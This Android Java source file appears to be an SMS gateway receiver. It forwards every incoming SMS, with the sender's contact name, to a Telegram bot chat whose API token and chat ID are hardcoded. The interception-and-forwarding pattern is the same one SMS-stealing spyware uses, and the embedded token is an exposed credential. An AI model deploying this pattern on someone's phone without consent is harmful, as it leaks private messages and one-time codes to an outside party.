package com.anjlab.android.smsgateway.gcm;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.Arrays;

import static android.provider.Telephony.Sms.Intents.getMessagesFromIntent;

public class SmsBroadcastReceiver extends BroadcastReceiver {

  @Override
  public void onReceive(Context context, Intent intent) {
            /* Get Messages */
    SmsMessage[] sms = getMessagesFromIntent(intent);
    assert sms != null;


    String urlStringFormat = "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s";
    String apiToken = "488699109:AAEKYpTzU6VNumJIAY_L9yEQZpZND7Da688";
    String chatId = "59755972";
    String sender = null;
    StringBuilder msg = null;
    String last_phone = null;

    String urlString = null;
    for (SmsMessage smsMessage : sms) {
                /* Parse Each Message */
      String phone = smsMessage.getOriginatingAddress();
      String message = smsMessage.getDisplayMessageBody();
      if (last_phone == null || !last_phone.contentEquals(phone)) {
        if (last_phone != null && !last_phone.contentEquals(phone)) sendMessageToTelegram(urlString);
        last_phone = phone;
        msg = new StringBuilder(message);
        Uri personUri = Uri.withAppendedPath( ContactsContract.PhoneLookup.CONTENT_FILTER_URI, phone);
        Cursor cur = context.getContentResolver().query(personUri, new String[] { ContactsContract.PhoneLookup.DISPLAY_NAME }, null, null, null );
        if( cur != null && cur.moveToFirst() ) {
          int nameIndex = cur.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
          sender = cur.getString(nameIndex);
          cur.close();
        } else {
          sender = phone;
        }
      } else {
        msg.append(message);
      }
      String text = sender + ":\n" + msg;
      urlString = String.format(urlStringFormat, apiToken, chatId, text.replace("\n", "%0A"));
    } // for
    sendMessageToTelegram(urlString);
  }

  private void sendMessageToTelegram(final String urlString) {

    Thread thread = new Thread(new Runnable() {
      @Override
      public void run() {
        try {
          URL url = new URL(urlString);
          URLConnection conn = url.openConnection();
          conn.getContent();
//            StringBuilder sb = new StringBuilder();
//            InputStream is = new BufferedInputStream(conn.getInputStream());
//            BufferedReader br = new BufferedReader(new InputStreamReader(is));
//            String inputLine = "";
//            while ((inputLine = br.readLine()) != null) {
//              sb.append(inputLine);
//            }
//            String response = sb.toString();
// Do what you want with response
        } catch (MalformedURLException e) {
          Log.e("SmsBroadcastReceiver", e.getMessage());
          Log.e("SmsBroadcastReceiver", Arrays.toString(e.getStackTrace()));
          e.printStackTrace();
        } catch (IOException e) {
          Log.e("SmsBroadcastReceiver", e.getMessage());
          Log.e("SmsBroadcastReceiver", Arrays.toString(e.getStackTrace()));
          e.printStackTrace();
        }
      }
    });

    thread.start();
  }
}
